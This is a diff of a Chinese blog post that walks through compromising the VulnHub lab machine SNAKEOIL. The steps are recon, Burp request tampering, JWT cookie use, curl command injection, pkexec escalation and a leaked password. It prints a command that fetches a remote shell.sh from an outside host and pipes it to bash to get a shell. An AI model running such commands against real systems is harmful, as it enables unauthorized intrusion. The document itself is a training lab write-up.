@@ -32,7 +32,7 @@
 
 
   <title>
-VULNHUB SNAKEOIL - VULNHUB |
+VULNHUB 25 SNAKEOIL - VULNHUB |
 Phut Hon = X_T = 天行健，君子以自强不息</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -60,7 +60,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">VULNHUB SNAKEOIL
+  <h1 itemprop="name headline">VULNHUB 25 SNAKEOIL
   </h1>
   
 <div class="meta">
@@ -76,7 +76,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>3.1k</span>
+    <span>3.3k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -84,7 +84,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">阅读时长</span>
-    <span>5 分钟</span>
+    <span>6 分钟</span>
   </span>
 </div>
 
@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/lO78YkmNuUB9rZ1.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/js4tJW7km8aqygU.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wmLsgUnzhOubvFR.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/JUZqV6zBpbmk97w.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NFMXjWC8xLSV4OD.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wtMDNgHs8rxSKpl.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BRgyaX5iTpFLeYQ.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/OqCyTJE92HvirRI.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/lzxCnDdB1eoSati.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/S4bepoyLPicVCx5.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/dwNFSq4OhisgMJn.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/CKLJoFjD9nR34Sm.jpg"></li>
         </ul>
       </div>
     </header>
@@ -170,103 +170,127 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 
     <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGlnaXRhbHdvcmxkbG9jYWwtc25ha2VvaWwsNzM4Lw==">https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/</span><br>
  教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2ODg5NjQuaHRtbA==">https://www.cnblogs.com/sainet/p/15688964.html</span></p>
-<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
-<p>攻击机 kali： 1 92.168.31.135<br>
- 靶机 SNAKEOIL：桥接于 1 92.168.31.1 的网卡，ip 未知</p>
+<h3 id="确认攻击目标"><a class="markdownIt-Anchor" href="#确认攻击目标">#</a> 确认攻击目标</h3>
+<p>攻击机 KALI： 192.168.31.135<br>
+ 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知</p>
 <p>1 ）确定靶机 ip 地址<br>
- sudo arp-scan -l</p>
-<p>à 靶机 ip：<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzE=">http://192.168.31</span>. 14 3/</p>
+ <code>sudo arp-scan -l</code></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-580.png" alt></p>
+<p>-&gt; 靶机 ip：192.168.31.143</p>
 <p>2 ）确认靶机 ip 开放的端口信息<br>
- sudo nmap - p- 192.168.31. 143</p>
-<p>à 靶机开放端口 22 ， 80 ， 8080</p>
-<h3 id="002-信息收集content-typecookie认证"><a class="markdownIt-Anchor" href="#002-信息收集content-typecookie认证">#</a> 002 信息收集，Content-type,Cookie 认证</h3>
-<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==">http://192.168.31.102/</span> 进行信息收集</p>
-<p>dirsearch -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMQ==">http://192.168.31.1</span> 43 /</p>
+ <code>sudo nmap -p- 192.168.31.143</code></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-581.png" alt></p>
+<p>-&gt; 靶机开放端口 22,80,8080</p>
+<h3 id="网站信息收集"><a class="markdownIt-Anchor" href="#网站信息收集">#</a> 网站信息收集</h3>
+<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTAy">http://192.168.31.102</span> 进行信息收集</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-582.png" alt></p>
+<p><code>dirsearch -u http://192.168.31.143</code></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-583.png" alt></p>
+<p>-&gt; 80 端口没有任何发现</p>
 <p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv">http://192.168.31.143:8080/</span> 进行信息收集</p>
-<p>dirsearch -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv">http://192.168.31.143:8080/</span></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-584.png" alt></p>
+<p><code>dirsearch -u http://192.168.31.143:8080/</code></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-585.png" alt></p>
+<p>-&gt; 8080 端口存在以下目录</p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=">http://192.168.31.143:8080/login</span><br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u">http://192.168.31.143:8080/registration</span><br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0">http://192.168.31.143:8080/secret</span><br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==">http://192.168.31.143:8080/test</span><br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=">http://192.168.31.143:8080/users</span></p>
-<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=">http://192.168.31.143:8080/login</span></p>
-<h3 id="说请求方法错了抓包看下数据包"><a class="markdownIt-Anchor" href="#说请求方法错了抓包看下数据包">#</a> 说请求方法错了，抓包看下数据包：</h3>
-<h3 id="说提交方法有问题换其他的提交方法"><a class="markdownIt-Anchor" href="#说提交方法有问题换其他的提交方法">#</a> 说提交方法有问题，换其他的提交方法</h3>
-<p>说 username 字段不能为空，那就加上 username 字段</p>
-<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u">http://192.168.31.143:8080/registration</span></p>
-<h3 id="说请求方法错了抓包看下数据包-2"><a class="markdownIt-Anchor" href="#说请求方法错了抓包看下数据包-2">#</a> 说请求方法错了，抓包看下数据包：</h3>
-<h3 id="同样说提交方法有问题换其他的提交方法"><a class="markdownIt-Anchor" href="#同样说提交方法有问题换其他的提交方法">#</a> 同样说提交方法有问题，换其他的提交方法</h3>
-<p>说 username 字段不能为空，那就加上 username 字段</p>
-<p>没啥效果，去访问其他页面看看 http://192.168.31.143:8080/users</p>
-<p>发现确实需要 username 和 password 两个字段<br>
-仔细观察数据包，发现缺少 Content-type 字段：<br>
-application/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是<br>
-标准的编码格式。<br>
-multipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消<br>
-息中的一个部分。<br>
-text/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字<br>
-符。</p>
-<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u">http://192.168.31.143:8080/registration</span><br>
+<h3 id="burp-篡改数据包"><a class="markdownIt-Anchor" href="#burp-篡改数据包">#</a> BURP 篡改数据包</h3>
+<p>查看目录: <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=">http://192.168.31.143:8080/login</span></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-586.png" alt></p>
+<p>提示请求方法错了，抓包看下数据包：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-587.png" alt></p>
+<p>提示提交方法有问题，换其他的提交方法</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-588.png" alt></p>
+<p>提示 username 字段不能为空，那就加上 username 字段</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-589.png" alt></p>
+<p>-&gt; 提示内容不理解，换其他目录查看</p>
+<p>查看目录:<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u">http://192.168.31.143:8080/registration</span></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-590.png" alt></p>
+<p>提示请求方法错了，抓包看下数据包：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-591.png" alt></p>
+<p>提示提交方法有问题，换其他的提交方法</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-592.png" alt></p>
+<p>提示 username 字段不能为空，那就加上 username 字段</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-593.png" alt></p>
+<p>-&gt; 没啥效果，去访问其他页面看看 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=">http://192.168.31.143:8080/users</span></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-594.png" alt></p>
+<p>-&gt; 猜测确实需要 username 和 password 两个字段</p>
+<h3 id="content-type-字段利用"><a class="markdownIt-Anchor" href="#content-type-字段利用">#</a> Content-Type 字段利用</h3>
+<p>仔细观察数据包，发现缺少 Content-type 字段：<br>
+application/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。<br>
+multipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。<br>
+text/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。</p>
+<p>访问目录:<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u">http://192.168.31.143:8080/registration</span><br>
  添加字段：Content-Type:application/x-www-form-urlencoded</p>
-<p>又提示 password 字段不能为空，再加上 password 字段：</p>
-<p>说注册成功了，那就在 /login 页面登陆一下，要加上用户名和密码：</p>
-<h3 id="再访问一些别的页面现在是在登陆状态中"><a class="markdownIt-Anchor" href="#再访问一些别的页面现在是在登陆状态中">#</a> 再访问一些别的页面（现在是在登陆状态中）：</h3>
-<h3 id="用更大的字典又扫了一遍目录发现两个新目录"><a class="markdownIt-Anchor" href="#用更大的字典又扫了一遍目录发现两个新目录">#</a> 用更大的字典又扫了一遍目录，发现两个新目录</h3>
+<p><img data-src="/N1h1l157/VULNHUB/image-595.png" alt></p>
+<p>提示变了，password 字段不能为空，再加上 password 字段：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-596.png" alt></p>
+<p>注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-597.png" alt></p>
+<p>再访问一些别的页面（现在是在登陆状态中）：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-598.png" alt></p>
+<p>-&gt; 没啥新发现</p>
+<h3 id="扩大信息面"><a class="markdownIt-Anchor" href="#扩大信息面">#</a> 扩大信息面</h3>
+<p>用更大的字典又扫了一遍目录，发现两个新目录</p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl">http://192.168.31.143:8080/create</span><br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu">http://192.168.31.143:8080/run</span></p>
-<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu">http://192.168.31.143:8080/run</span></p>
-<h3 id="抓取数据包"><a class="markdownIt-Anchor" href="#抓取数据包">#</a> 抓取数据包</h3>
-<h3 id="修改提交方法为post"><a class="markdownIt-Anchor" href="#修改提交方法为post">#</a> 修改提交方法为 POST</h3>
-<p>说要以 url:port 形式提供要请求的 URL：</p>
-<p>记得格式要换成 Content-Type: application/json， 在 ajax 中，如果没加<br>
- contentType:“application/json”，那么 data 就对应的是 json 对象；反之，<br>
-如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。</p>
-<p>现在又说需要 secret key ，访问一下 /secret 页面：</p>
-<p>应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：<br>
-“access_token”:<br>
-“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6<br>
-MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlO<br>
-WJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2N<br>
-TI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3<br>
-H7CSshM5oXZYl2XpSDo”</p>
-<p>想起来之前网站打开后有过一些配置信息链接，从中找到了 cookie 的名称</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-599.png" alt></p>
+<p>查看目录:<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu">http://192.168.31.143:8080/run</span></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-600.png" alt></p>
+<p>提示需要修改请求方法，抓取数据包</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-601.png" alt></p>
+<p>修改提交方法为 POST</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-602.png" alt></p>
+<p>提示要以 url:port 形式提供要请求的 URL：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-603.png" alt></p>
+<p>格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-604.png" alt></p>
+<p>-&gt; 现在又提示需要 secret key ，</p>
+<h3 id="伪造-access_token"><a class="markdownIt-Anchor" href="#伪造-access_token">#</a> 伪造 access_token</h3>
+<p>访问一下 /secret 页面：</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-605.png" alt></p>
+<p>登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：<br>
+ <code>“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”</code></p>
+<p>但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的<br>
+翻阅网站，找到以下地址中网站中有个链接</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-606.png" alt></p>
+<p>点进去看看，有一些配置信息链接，从中找到了 cookie 的名称</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-607.png" alt></p>
 <p>再次提交 cookie，字段名字为 access_token_cookie：</p>
-<p>得到 “secret_key”: “commandexecutionissecret”</p>
-<p>重新梳理一下思路：<br>
-1 . 访问 registration,login 页面，因为 Get 方式报错，所以改为了 Post 方式<br>
-提示 uname 字段缺失，因此增加了该字段，但是无效果<br>
- 2 . 访问 users 页面，发现确实需要 uname 和 password 两个字段<br>
- 3 . 重新审查 registration 数据包，发现缺少 Content-Type 字段<br>
- 4 . 在 registration 添加字段：Content-Type:application/x-www-form-<br>
-urlencoded 后成功提交了 uname 数据<br>
-提示缺少 password 字段，添加后返回注册成功的消息<br>
- 5 . 在 login 中添加 Content-Type 与 uname 和 password 后登陆成功，返回了<br>
- access_token<br>
-6 . 访问 run 页面，发现需要提交 url：port 数据，修改 Content-Type 为 json<br>
- 数据后，把 url 和 port 提交，提示需要 secret_key</p>
-<p>7. 访问 secret 页面，发现返回错误，推测与 login 登陆后返回的 token 有关，但<br>
- cookies 的字段名是不知道的<br>
- 8 . 点击网站，搜寻到 cookies 的字段名为 access_token_cookie，将 cookies 的字段<br>
-名修改后重新提交到 secret 页面，返回了 secret_key<br>
-9 . 接下来需要访问 run 界面，并且把上述得到的 secret_key 加上</p>
-<h3 id="003-rce命令注入-curl反弹shell"><a class="markdownIt-Anchor" href="#003-rce命令注入-curl反弹shell">#</a> 003 RCE 命令注入 curl 反弹 shell</h3>
+<p><img data-src="/N1h1l157/VULNHUB/image-608.png" alt></p>
+<p>-&gt; 得到 “secret_key”: “commandexecutionissecret”</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新梳理一下思路：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示<span class="built_in">uname</span>字段缺失，因此增加了该字段，但是无效果</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2 .访问<span class="built_in">users</span>页面，发现确实需要<span class="built_in">uname</span>和password两个字段</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3 .重新审查registration数据包，发现缺少Content-Type字段</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了<span class="built_in">uname</span>数据提示缺少password字段，添加后返回注册成功的消息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5 .在login中添加Content-Type与<span class="built_in">uname</span>和password后登陆成功，返回了access_token</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9 .接下来需要访问run界面，并且把上述得到的secret_key加上</span></span><br></pre></td></tr></table></figure>
+<h3 id="curl-rce-命令执行"><a class="markdownIt-Anchor" href="#curl-rce-命令执行">#</a> CURL RCE 命令执行</h3>
 <p>访问 run 界面，加上 secret_key 字段</p>
-<p>返回了比较奇怪的字符串，直接搜索发现这是 curl 命令执行后的回显</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-609.png" alt></p>
+<p>返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-610.png" alt></p>
 <p>相当于在 curl 后拼接命令，但是管道符号不起作用</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-611.png" alt></p>
 <p>后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞</p>
-<p>发现可以注入，尝试往其中写入 shell：<br>
-curl <span class="exturl" data-url="aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=">http://www.chentuo.asia/shell.sh</span> | bash;</p>
-<p>curl <span class="exturl" data-url="aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=">http://www.chentuo.asia/shell.sh</span> | sh;</p>
-<p>登陆成功，拿到了 patrick 的权限</p>
-<h3 id="004-pkexec-sudo-su提权"><a class="markdownIt-Anchor" href="#004-pkexec-sudo-su提权">#</a> 004 pkexec、sudo su 提权</h3>
+<p><img data-src="/N1h1l157/VULNHUB/image-612.png" alt></p>
+<p>尝试往其中写入 shell: <code>curl http://www.chentuo.asia/shell.sh | bash;</code></p>
+<p><img data-src="/N1h1l157/VULNHUB/image-613.png" alt></p>
+<p>尝试:`curl <span class="exturl" data-url="aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=">http://www.chentuo.asia/shell.sh</span> | sh;``</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-614.png" alt></p>
+<p>-&gt; 登陆成功，拿到了 patrick 的权限</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-615.png" alt></p>
+<h3 id="pkexec-提权"><a class="markdownIt-Anchor" href="#pkexec-提权">#</a> pkexec 提权</h3>
 <p>服务器存在 s 权限的 pkexec，并且有 gcc 编译器</p>
-<p>通过 pkexec 进行提权，成功拿到了 root 权限</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-616.png" alt></p>
+<p>-&gt; 通过 pkexec 进行提权，成功拿到了 root 权限</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-617.png" alt></p>
+<h3 id="配置文件泄露"><a class="markdownIt-Anchor" href="#配置文件泄露">#</a> 配置文件泄露</h3>
 <p>看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权<br>
 调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码</p>
-<p>找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到：<br>
-Sudo su 通过 patrick 的密码来提到 root<br>
- 测试后发现正确的是 NOreasonableDOUBTthisPASSWORDisGOOD</p>
-<p>提权成功，拿到了 root 权限</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-618.png" alt></p>
+<p>找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD<br>
+sudo su 使用此密码通过 patrick 来提到 root</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-619.png" alt></p>
+<p>-&gt; 提权成功，拿到了 root 权限</p>
 
       <div class="tags">
           <a href="/tags/VULNHUB-21-30/" rel="tag"><i class="ic i-tag"></i> VULNHUB 21-30</a>
@@ -281,9 +305,9 @@ Sudo su 通过 patrick 的密码来提到 root<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-04 23:15:08" itemprop="dateModified" datetime="2023-07-04T23:15:08+08:00">2023-07-04</time>
+    <time title="修改时间：2023-07-06 00:15:26" itemprop="dateModified" datetime="2023-07-06T00:15:26+08:00">2023-07-06</time>
   </span>
-  <span id="2021/11/01/VULNHUB/125 SNAKEOIL/" class="item leancloud_visitors" data-flag-title="VULNHUB SNAKEOIL" title="阅读次数">
+  <span id="2021/11/01/VULNHUB/125 SNAKEOIL/" class="item leancloud_visitors" data-flag-title="VULNHUB 25 SNAKEOIL" title="阅读次数">
       <span class="icon">
         <i class="ic i-eye"></i>
       </span>
@@ -325,7 +349,7 @@ Sudo su 通过 patrick 的密码来提到 root<br>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://n1h1l157.github.io/2021/11/01/VULNHUB/125%20SNAKEOIL/" title="VULNHUB SNAKEOIL">http://n1h1l157.github.io/2021/11/01/VULNHUB/125 SNAKEOIL/</a>
+    <a href="http://n1h1l157.github.io/2021/11/01/VULNHUB/125%20SNAKEOIL/" title="VULNHUB 25 SNAKEOIL">http://n1h1l157.github.io/2021/11/01/VULNHUB/125 SNAKEOIL/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -344,20 +368,20 @@ Sudo su 通过 patrick 的密码来提到 root<br>
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;DZRlqjoQg3XAKsz.jpg" title="VULNHUB PRESIDENTIAL">
+  <a href="/2021/11/01/VULNHUB/115%20THALES/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;KopmzJq4geNSalr.jpg" title="VULNHUB 15 THALES">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB PRESIDENTIAL</h3>
+  <h3>VULNHUB 15 THALES</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/123%20KEYRING/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;DZRlqjoQg3XAKsz.jpg" title="VULNHUB 23 KEYRING">
+  <a href="/2021/11/01/VULNHUB/127%20TYPO/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;dwNFSq4OhisgMJn.jpg" title="VULNHUB 27 TYPO">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 23 KEYRING</h3>
+  <h3>VULNHUB 27 TYPO</h3>
   </a>
 
     </div>
@@ -376,11 +400,11 @@ Sudo su 通过 patrick 的密码来提到 root<br>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86content-typecookie%E8%AE%A4%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text"> 002 信息收集，Content-type,Cookie 认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E9%94%99%E4%BA%86%E6%8A%93%E5%8C%85%E7%9C%8B%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">3.</span> <span class="toc-text"> 说请求方法错了，抓包看下数据包：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95%E6%9C%89%E9%97%AE%E9%A2%98%E6%8D%A2%E5%85%B6%E4%BB%96%E7%9A%84%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text"> 说提交方法有问题，换其他的提交方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E9%94%99%E4%BA%86%E6%8A%93%E5%8C%85%E7%9C%8B%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%8C%85-2"><span class="toc-number">5.</span> <span class="toc-text"> 说请求方法错了，抓包看下数据包：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%A0%B7%E8%AF%B4%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95%E6%9C%89%E9%97%AE%E9%A2%98%E6%8D%A2%E5%85%B6%E4%BB%96%E7%9A%84%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text"> 同样说提交方法有问题，换其他的提交方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E8%AE%BF%E9%97%AE%E4%B8%80%E4%BA%9B%E5%88%AB%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%8E%B0%E5%9C%A8%E6%98%AF%E5%9C%A8%E7%99%BB%E9%99%86%E7%8A%B6%E6%80%81%E4%B8%AD"><span class="toc-number">7.</span> <span class="toc-text"> 再访问一些别的页面（现在是在登陆状态中）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%9B%B4%E5%A4%A7%E7%9A%84%E5%AD%97%E5%85%B8%E5%8F%88%E6%89%AB%E4%BA%86%E4%B8%80%E9%81%8D%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0%E4%B8%A4%E4%B8%AA%E6%96%B0%E7%9B%AE%E5%BD%95"><span class="toc-number">8.</span> <span class="toc-text"> 